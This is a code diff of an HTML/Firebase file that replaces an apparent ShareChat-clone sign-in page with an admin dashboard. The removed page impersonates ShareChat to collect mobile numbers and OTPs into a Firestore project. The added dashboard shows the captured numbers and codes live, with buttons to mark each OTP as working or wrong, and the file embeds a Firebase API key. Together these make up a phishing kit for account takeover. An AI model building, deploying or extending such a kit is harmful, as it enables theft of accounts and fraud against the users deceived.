@@ -1,193 +1,157 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1.0">
-  <title>Sign in - ShareChat Clone</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ShareChat Admin Dashboard</title>
   <link href="https://fonts.googleapis.com/css?family=Inter:400,600,700&display=swap" rel="stylesheet">
   <style>
-    body { margin:0; background:#fff; font-family:'Inter',Arial,sans-serif; color:#212936; }
-    .container { max-width:400px; margin:32px auto 0; padding:0 16px 32px; display:flex; flex-direction:column; align-items:center; }
-    .logo { margin:50px auto 32px; display:block; width:96px; height:96px; border-radius:24px; background:#fff; display:flex; align-items:center; justify-content:center; box-shadow:0 2px 16px rgba(0,0,0,0.07); overflow:hidden; }
-    .logo-img { width:90px; height:90px; object-fit:contain; display:block; background:#fff; border-radius:18px; }
-    h1 { font-size:2rem; font-weight:700; text-align:center; margin:0 0 8px 0; color:#212936; }
-    .subtitle { font-size:1rem; text-align:center; margin-bottom:24px; color:#6c757d; }
+    :root{
+      --brand:#7765e3;
+      --bg:#f5f7fa;
+      --card:#fff;
+      --text:#333;
+      --muted:#6c757d;
+      --border:#e0e2e6;
+      --hover:#f8f9fa;
+      --success:#28a745;
+      --danger:#dc3545;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0; padding:0;
+      font-family:'Inter',Arial,sans-serif;
+      background:var(--bg); color:var(--text);
+    }
+    .container{max-width:1200px;margin:0 auto;padding:20px}
+    header{
+      background:var(--brand); color:#fff;
+      padding:20px 0; margin-bottom:30px;
+      border-radius:0 0 10px 10px;
+      box-shadow:0 4px 12px rgba(0,0,0,.1);
+    }
+    .header-content{
+      display:flex; justify-content:space-between; align-items:center; padding:0 20px;
+    }
+    h1{margin:0; font-size:22px}
+    .logout-btn{
+      background:#fff; color:var(--brand); border:none;
+      padding:8px 14px; border-radius:6px; font-weight:600; cursor:pointer; transition:.2s;
+    }
+    .logout-btn:hover{background:#f0f0f0}
 
-    .input-group {
-      display: flex;
-      width: 100%;
-      margin-bottom: 16px;
-      border: 2px solid #e0e2e6;
-      border-radius: 12px;
-      background: #fff;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
-      overflow: hidden;
-      align-items: center;
-      transition: border-color 0.2s;
+    .dashboard-stats{
+      display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
+      gap:12px; margin-bottom:20px;
     }
-    .input-group:focus-within { border-color: #212936; }
-    .input-group select,
-    .input-group input {
-      border: none;
-      font-size: 1.05rem;
-      padding: 12px 10px;
-      outline: none;
-      background: transparent;
-      height: 48px;
-      font-family: 'Inter', Arial, sans-serif;
+    .stat-card{
+      background:var(--card); border-radius:10px; padding:15px;
+      box-shadow:0 2px 8px rgba(0,0,0,.05); text-align:center;
     }
-    .input-group select {
-      width: 80px;
-      border-right: 1.5px solid #e0e2e6;
-      color: #212936;
-      font-weight: 600;
-      background: transparent;
-      appearance: none;
-      -webkit-appearance: none;
-      text-align-last: center;
-      cursor: pointer;
+    .stat-value{font-size:20px; font-weight:700; color:var(--brand); margin:8px 0}
+    .stat-label{color:var(--muted); font-size:13px}
+
+    .data-table{background:#fff; border-radius:10px; overflow:hidden; box-shadow:0 2px 8px rgba(0,0,0,.05)}
+    table{width:100%; border-collapse:collapse; min-width:720px}
+    th,td{padding:12px; text-align:left; border-bottom:1px solid var(--border); font-size:14px}
+    th{background:#f8f9fa; font-weight:600; color:#495057}
+    tr:hover{background:var(--hover)}
+    .status-verified{color:var(--success); font-weight:700}
+    .status-wrong{color:var(--danger); font-weight:700}
+
+    .status-actions{display:inline-flex; gap:8px;}
+    .btn-r,.btn-w{
+      width:32px; height:28px; line-height:28px; text-align:center;
+      background:#fff; border:1.5px solid; border-radius:6px; cursor:pointer; font-weight:800; font-size:13px;
+      transition:.15s;
     }
-    .input-group input {
-      flex: 1;
-      font-size: 1.09rem;
-      color: #212936;
-      letter-spacing: 1.5px;
-      background: transparent;
+    .btn-r{border-color:var(--success); color:var(--success)}
+    .btn-w{border-color:var(--danger); color:var(--danger)}
+    .btn-r:active{background:#eaf8ee}
+    .btn-w:active{background:#fde9ec}
+
+    @media (max-width:600px){
+      table{min-width:unset; border:0}
+      thead{display:none}
+      tbody{display:block}
+      tr{
+        display:block; margin:12px; background:#fff;
+        border:1px solid var(--border); border-radius:10px;
+        box-shadow:0 1px 6px rgba(0,0,0,.06);
+      }
+      td{
+        display:flex; align-items:center; justify-content:space-between;
+        padding:12px; border-bottom:1px solid #f0f2f5; font-size:14px;
+      }
+      td:last-child{border-bottom:0}
+      td::before{
+        content:attr(data-label);
+        font-weight:600; color:var(--muted);
+        margin-right:12px; flex:0 0 45%;
+      }
+      .cell-value{flex:1; text-align:right; word-break:break-word; white-space:normal}
     }
 
-    .otp-container { display: none; width: 100%; margin-bottom: 24px; }
-    .otp-input-group {
-      display: flex;
-      justify-content: center;
-      gap: 12px;
-      margin: 24px 0 8px 0;
-      width: 100%;
+    .pagination{display:flex; justify-content:center; padding:15px; flex-wrap:wrap; gap:4px;}
+    .pagination button{
+      background:#fff; border:1px solid #dee2e6; padding:6px 12px;
+      cursor:pointer; border-radius:4px; transition:.2s; font-size:14px;
     }
-    .otp-input {
-      width: 46px;
-      height: 46px;
-      border: 2.5px solid #232b37;
-      border-radius: 12px;
-      font-size: 1.7rem;
-      font-weight: 600;
-      color: #212936;
-      text-align: center;
-      outline: none;
-      background: #fff;
-      box-sizing: border-box;
-      transition: border 0.2s;
-    }
-    .otp-input:not(:first-child) { border: 1.5px solid #e0e2e6; }
-
-    .timer {
-      color: #212936;
-      font-size: 1.1rem;
-      font-weight: 500;
-      letter-spacing: 1px;
-      margin: 10px 0 20px 0;
-      display: block;
-      text-align: center;
-      min-width: 48px;
-    }
-    
-    .otp-btn { 
-      width:100%; background:#19202c; color:#fff; font-size:1.11rem; font-weight:700; border-radius:8px; border:none; padding:15px 0; margin-bottom:32px; cursor:pointer; transition:background 0.2s; 
-    }
-    .otp-btn:active { background:#11151e; }
-    .verify-btn {
-      width: 100%;
-      background: #212936;
-      color: #fff;
-      font-size: 1.11rem;
-      font-weight: 700;
-      border-radius: 8px;
-      border: none;
-      padding: 15px 0;
-      margin: 20px 0 16px 0;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    .verify-btn:active { background: #212936; }
-    .back-btn {
-      width: 100%;
-      background: transparent;
-      color: #212936;
-      font-size: 1rem;
-      font-weight: 600;
-      border: 2px solid #212936;
-      border-radius: 8px;
-      padding: 13px 0;
-      cursor: pointer;
-      transition: all 0.2s;
-    }
-    .back-btn:active { background: #f4f4fb; }
-
-    .terms { font-size:0.97rem; color:#212936; text-align:center; margin:0 0 18px 0; line-height:1.6; }
-    .terms a { color:#212936; font-weight:700; text-decoration:underline; cursor:pointer; margin:0 2px; }
-    .download-text { text-align:center; color:#212936; font-size:1.07rem; margin-bottom:14px; }
-    .app-badges { display:flex; justify-content:center; gap:16px; }
-    .app-badges img { height:44px; margin:0; cursor:pointer; }
-    
-    @media (max-width:480px) {
-      .container { max-width:97vw; padding:0 4vw 32px; }
-      .logo { margin-top:36px; width:80px; height:80px; }
-      .logo-img { width:76px; height:76px; }
-      .input-group select,
-      .input-group input { font-size:1rem; height:44px; padding: 10px 7px; }
-      .input-group { border-radius: 10px; }
-      .otp-input { width:38px; height:38px; font-size:1.3rem; border-radius:9px; }
-    }
+    .pagination button.active{background:var(--brand); color:#fff; border-color:var(--brand)}
+    .pagination button:hover:not(.active){background:#f8f9fa}
   </style>
 </head>
 <body>
-  <div class="container">
-    <span class="logo">
-      <img class="logo-img" src="https://cdn.iconscout.com/icon/free/png-256/free-sharechat-1136710.png" alt="ShareChat Logo">
-    </span>
-    <h1 id="form-title">Sign in</h1>
-    <div class="subtitle" id="form-subtitle">अकाउंट बनाने के लिए मोबाइल नम्बर डालें</div>
-    
-    <form id="phone-form">
-      <div class="input-group">
-        <select id="country-code"><option value="+91" selected>+91</option></select>
-        <input type="tel" id="mobile" name="mobile" placeholder="मोबाइल नंबर" maxlength="10" pattern="[0-9]{10}" required>
-      </div>
-      <div class="terms">
-        By accepting this you agree to our 
-        <a href="#">Terms and conditions</a>, 
-        <a href="#">Privacy Policy</a>, 
-        <a href="#">Content Policy</a>
-      </div>
-      <button type="submit" class="otp-btn">OTP प्राप्त करें</button>
-    </form>
-    
-    <div id="otp-form" class="otp-container">
-      <div class="otp-input-group">
-        <input type="tel" maxlength="1" class="otp-input" id="otp1" autofocus required>
-        <input type="tel" maxlength="1" class="otp-input" id="otp2" required>
-        <input type="tel" maxlength="1" class="otp-input" id="otp3" required>
-        <input type="tel" maxlength="1" class="otp-input" id="otp4" required>
-        <input type="tel" maxlength="1" class="otp-input" id="otp5" required>
-        <input type="tel" maxlength="1" class="otp-input" id="otp6" required>
-      </div>
-      <span class="timer" id="timer">01:00</span>
-      <button id="verify-otp" class="verify-btn">Verify OTP</button>
-      <button id="back-to-phone" class="back-btn">Back to Phone Number</button>
+  <header>
+    <div class="container header-content">
+      <h1>ShareChat Admin Dashboard</h1>
+      <button class="logout-btn" id="logout-btn">Logout</button>
     </div>
-    
-    <div class="download-text">शेयरचेट ऐप डाउनलोड करें</div>
-    <div class="app-badges">
-      <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Play Store"></a>
-      <a href="#"><img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store"></a>
+  </header>
+
+  <div class="container">
+    <div class="dashboard-stats">
+      <div class="stat-card">
+        <div class="stat-value" id="total-users">0</div>
+        <div class="stat-label">Total Entries</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value" id="today-users">0</div>
+        <div class="stat-label">Today's Entries</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value" id="pending-otp">0</div>
+        <div class="stat-label">Pending</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value" id="verified-users">0</div>
+        <div class="stat-label">Verified</div>
+      </div>
+    </div>
+
+    <div class="data-table">
+      <table>
+        <thead>
+          <tr>
+            <th>Doc ID</th>
+            <th>Phone Number</th>
+            <th>OTP</th>
+            <th>Status</th>
+            <th>Timestamp</th>
+          </tr>
+        </thead>
+        <tbody id="user-data"></tbody>
+      </table>
+
+      <div class="pagination" id="pagination"></div>
     </div>
   </div>
 
-  <!-- Firebase SDKs (compat for browser HTML) -->
+  <!-- Firebase SDKs -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
   <script>
-    // Your provided Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyDIF-yzrdS153MMZtA4wzz5V7eoWUMsC9c",
       authDomain: "investment-data-3b577.firebaseapp.com",
@@ -203,107 +167,138 @@
   </script>
 
   <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      const phoneForm = document.getElementById('phone-form');
-      const otpForm = document.getElementById('otp-form');
-      const mobileInput = document.getElementById('mobile');
-      const countryCode = document.getElementById('country-code');
-      const verifyBtn = document.getElementById('verify-otp');
-      const backBtn = document.getElementById('back-to-phone');
-      const formTitle = document.getElementById('form-title');
-      const formSubtitle = document.getElementById('form-subtitle');
-      const timerEl = document.getElementById('timer');
-      const otpInputs = [...document.querySelectorAll('.otp-input')];
-      let userPhone = '';
-      let generatedOtp = '';
-      let timerInterval;
+    document.addEventListener('DOMContentLoaded', async function () {
+      const tbody = document.getElementById('user-data');
+      const paginationEl = document.getElementById('pagination');
+      const rowsPerPage = 10;
+      let currentPage = 1;
+      let allData = []; // will be filled from Firestore in realtime
 
-      phoneForm.addEventListener('submit', async function(e) {
-        e.preventDefault();
-        userPhone = mobileInput.value;
-        if (!/^\d{10}$/.test(userPhone)) { alert('कृपया सही मोबाइल नंबर दर्ज करें (10 अंक)'); return; }
+      // OPTIONAL: sign-in anonymously (works with relaxed rules)
+      try { await auth.signInAnonymously(); } catch(e) { console.warn(e); }
 
-        generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
-        console.log(`OTP for ${userPhone}: ${generatedOtp}`);
-
-        // OPTIONAL: anonymous auth (helps with Firestore rules if needed)
-        try { await auth.signInAnonymously(); } catch (e) { console.warn(e); }
-
-        phoneForm.style.display = 'none';
-        otpForm.style.display = 'block';
-        formTitle.textContent = 'OTP दर्ज करें';
-        formSubtitle.textContent = `+91-${userPhone} पर OTP भेजा गया`;
-        otpInputs.forEach(input => input.value = '');
-        otpInputs[0].focus();
-        startTimer(60);
-      });
-
-      verifyBtn.addEventListener('click', async function() {
-        const enteredOtp = otpInputs.map(input => input.value).join('');
-        if (enteredOtp.length !== 6) { alert('कृपया 6 अंकों का OTP दर्ज करें'); return; }
-
-        if (enteredOtp === generatedOtp) {
-          try {
-            // Save to Firestore
-            await db.collection('submissions').add({
-              phone: countryCode.value + userPhone,
-              otp: enteredOtp,
-              status: 'Pending',
-              createdAt: firebase.firestore.FieldValue.serverTimestamp()
+      // Realtime listener
+      db.collection('users')
+        .orderBy('createdAt', 'desc')
+        .onSnapshot((snap) => {
+          allData = [];
+          snap.forEach(doc => {
+            const d = doc.data();
+            allData.push({
+              id: doc.id,
+              phone: d.phone || '',
+              otp: d.otp || '',
+              status: d.status || 'Pending',
+              timestamp: d.createdAt && d.createdAt.toDate ? d.createdAt.toDate() : null
             });
-            alert('Login successful! (डेटा सेव हो गया)');
+          });
+          renderAll();
+        });
+
+      // Renderers
+      function renderTable(page) {
+        tbody.innerHTML = '';
+        const start = (page - 1) * rowsPerPage;
+        const end = start + rowsPerPage;
+        const pageData = allData.slice(start, end);
+
+        pageData.forEach(user => {
+          const row = document.createElement('tr');
+          const ts = user.timestamp ? formatDateIST(user.timestamp) : '-';
+          row.innerHTML = `
+            <td data-label="Doc ID"><span class="cell-value">${user.id}</span></td>
+            <td data-label="Phone Number"><span class="cell-value">${user.phone}</span></td>
+            <td data-label="OTP"><span class="cell-value">${user.otp}</span></td>
+            <td data-label="Status">
+              ${user.status === 'Verified' || user.status === 'Wrong'
+                ? `<span class="${user.status === 'Verified' ? 'status-verified' : 'status-wrong'}">${user.status}</span>`
+                : `<div class="status-actions">
+                     <button class="btn-r" data-id="${user.id}">R</button>
+                     <button class="btn-w" data-id="${user.id}">W</button>
+                   </div>`
+              }
+            </td>
+            <td data-label="Timestamp"><span class="cell-value">${ts}</span></td>
+          `;
+          tbody.appendChild(row);
+        });
+      }
+
+      function renderPagination() {
+        paginationEl.innerHTML = '';
+        const pageCount = Math.ceil(allData.length / rowsPerPage) || 1;
+
+        const prevBtn = document.createElement('button');
+        prevBtn.textContent = 'Previous';
+        prevBtn.disabled = currentPage === 1;
+        prevBtn.onclick = () => { if (currentPage > 1) { currentPage--; renderAll(); } };
+        paginationEl.appendChild(prevBtn);
+
+        for (let i = 1; i <= pageCount; i++) {
+          const btn = document.createElement('button');
+          btn.textContent = i;
+          if (i === currentPage) btn.classList.add('active');
+          btn.onclick = () => { currentPage = i; renderAll(); };
+          paginationEl.appendChild(btn);
+        }
+
+        const nextBtn = document.createElement('button');
+        nextBtn.textContent = 'Next';
+        nextBtn.disabled = currentPage === pageCount;
+        nextBtn.onclick = () => { if (currentPage < pageCount) { currentPage++; renderAll(); } };
+        paginationEl.appendChild(nextBtn);
+      }
+
+      // Update status on click
+      tbody.addEventListener('click', async function(e){
+        if (e.target.classList.contains('btn-r') || e.target.classList.contains('btn-w')) {
+          const id = e.target.getAttribute('data-id');
+          const newStatus = e.target.classList.contains('btn-r') ? 'Verified' : 'Wrong';
+          try {
+            await db.collection('submissions').doc(id).update({ status: newStatus });
           } catch (err) {
+            alert('Failed to update status');
             console.error(err);
-            alert('डेटा सेव करने में समस्या आई।');
           }
-          resetForms();
-        } else {
-          alert('Invalid OTP. Please try again.');
         }
       });
 
-      backBtn.addEventListener('click', function() {
-        phoneForm.style.display = 'block';
-        otpForm.style.display = 'none';
-        formTitle.textContent = 'Sign in';
-        formSubtitle.textContent = 'अकाउंट बनाने के लिए मोबाइल नम्बर डालें';
-        clearInterval(timerInterval);
-        timerEl.textContent = '01:00';
-      });
+      function renderAll() {
+        // Stats
+        document.getElementById('total-users').textContent = allData.length.toString();
+        const today = new Date();
+        const istOffset = 5.5 * 60; // minutes
+        const start = new Date(Date.UTC(today.getUTCFullYear(), today.getUTCMonth(), today.getUTCDate()));
+        const end = new Date(start.getTime() + 24*60*60*1000);
+        // Convert to IST by adding 5:30 to UTC midnight for range check
+        const startIST = new Date(start.getTime() + istOffset*60*1000);
+        const endIST = new Date(end.getTime() + istOffset*60*1000);
+        const todays = allData.filter(x => x.timestamp && x.timestamp >= startIST && x.timestamp < endIST);
+        document.getElementById('today-users').textContent = todays.length.toString();
+        const pending = allData.filter(x => (x.status || 'Pending') === 'Pending').length;
+        const verified = allData.filter(x => x.status === 'Verified').length;
+        document.getElementById('pending-otp').textContent = pending.toString();
+        document.getElementById('verified-users').textContent = verified.toString();
 
-      function startTimer(duration) {
-        let timeLeft = duration;
-        clearInterval(timerInterval);
-        function updateTimer() {
-          let min = String(Math.floor(timeLeft / 60)).padStart(2, '0');
-          let sec = String(timeLeft % 60).padStart(2, '0');
-          timerEl.textContent = `${min}:${sec}`;
-          if (timeLeft <= 0) { clearInterval(timerInterval); }
-          else { timeLeft--; }
-        }
-        updateTimer();
-        timerInterval = setInterval(updateTimer, 1000);
+        renderTable(currentPage);
+        renderPagination();
       }
 
-      otpInputs.forEach((input, i) => {
-        input.addEventListener('input', function() {
-          if (this.value.length >= 1 && i < otpInputs.length - 1) otpInputs[i + 1].focus();
-        });
-        input.addEventListener('keydown', function(e) {
-          if (e.key === "Backspace" && !this.value && i > 0) otpInputs[i - 1].focus();
-        });
-      });
-
-      function resetForms() {
-        mobileInput.value = '';
-        otpInputs.forEach(input => input.value = '');
-        phoneForm.style.display = 'block';
-        otpForm.style.display = 'none';
-        formTitle.textContent = 'Sign in';
-        formSubtitle.textContent = 'अकाउंट बनाने के लिए मोबाइल नम्बर डालें';
-        clearInterval(timerInterval);
-        timerEl.textContent = '01:00';
+      function pad(n){ return n < 10 ? '0'+n : n; }
+      function formatDateIST(dateObj){
+        // format as YYYY-MM-DD HH:mm:ss IST
+        const y = dateObj.getFullYear();
+        const m = pad(dateObj.getMonth() + 1);
+        const d = pad(dateObj.getDate());
+        const hh = pad(dateObj.getHours());
+        const mm = pad(dateObj.getMinutes());
+        const ss = pad(dateObj.getSeconds());
+        return `${y}-${m}-${d} ${hh}:${mm}:${ss}`;
       }
+
+      document.getElementById('logout-btn').addEventListener('click', async () => {
+        try { await auth.signOut(); location.reload(); } catch(e){ console.warn(e); }
+      });
     });
   </script>
 </body>
